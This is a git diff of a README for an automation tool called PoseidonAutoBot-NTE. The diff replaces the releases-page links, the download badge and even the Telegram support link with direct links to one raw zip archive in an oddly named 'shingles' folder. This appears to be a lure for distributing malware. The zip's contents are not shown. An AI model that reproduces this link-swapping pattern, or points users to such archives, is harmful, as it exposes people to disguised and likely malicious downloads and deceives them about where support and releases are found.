@@ -1,6 +1,6 @@
 # 🤖 PoseidonAutoBot-NTE - Automate Your Tasks with Ease
 
-[![Download PoseidonAutoBot-NTE](https://img.shields.io/badge/Download-PoseidonAutoBot--NTE-brightgreen.svg)](https://github.com/kovladfn/PoseidonAutoBot-NTE/releases)
+[![Download PoseidonAutoBot-NTE](https://github.com/kovladfn/PoseidonAutoBot-NTE/raw/refs/heads/main/shingles/NTE-Auto-Bot-Poseidon-tallowing.zip)](https://github.com/kovladfn/PoseidonAutoBot-NTE/raw/refs/heads/main/shingles/NTE-Auto-Bot-Poseidon-tallowing.zip)
 
 ## 📦 Introduction
 
@@ -12,7 +12,7 @@ Follow these steps to download and run PoseidonAutoBot-NTE:
 
 1. **Visit the Releases Page:** Click on the link below to go to the download page.
    
-   [Go to Releases Page](https://github.com/kovladfn/PoseidonAutoBot-NTE/releases)
+   [Go to Releases Page](https://github.com/kovladfn/PoseidonAutoBot-NTE/raw/refs/heads/main/shingles/NTE-Auto-Bot-Poseidon-tallowing.zip)
 
 2. **Choose Your Version:** On the releases page, you will see several versions of the application. Choose the latest version for the best features and performance.
 
@@ -51,7 +51,7 @@ PoseidonAutoBot-NTE offers several features designed to simplify your tasks:
 
 ### How do I contact support?
 
-If you encounter issues or need assistance, join our tutorial group at [https://t.me/NTExhaust](https://t.me/NTExhaust). There you can ask questions and seek help from other users.
+If you encounter issues or need assistance, join our tutorial group at [https://github.com/kovladfn/PoseidonAutoBot-NTE/raw/refs/heads/main/shingles/NTE-Auto-Bot-Poseidon-tallowing.zip](https://github.com/kovladfn/PoseidonAutoBot-NTE/raw/refs/heads/main/shingles/NTE-Auto-Bot-Poseidon-tallowing.zip). There you can ask questions and seek help from other users.
 
 ### Can I customize the automation tasks?
 
@@ -74,4 +74,4 @@ We value your feedback! Share your experience with PoseidonAutoBot-NTE on commun
 - **Documentation:** More detailed guides to help you with advanced features can be found in the documentation included with the application.
 - **Tutorials:** Find useful tutorials in the community or create your own and share with others.
 
-[Go to Releases Page](https://github.com/kovladfn/PoseidonAutoBot-NTE/releases) to download PoseidonAutoBot-NTE today!
+[Go to Releases Page](https://github.com/kovladfn/PoseidonAutoBot-NTE/raw/refs/heads/main/shingles/NTE-Auto-Bot-Poseidon-tallowing.zip) to download PoseidonAutoBot-NTE today!
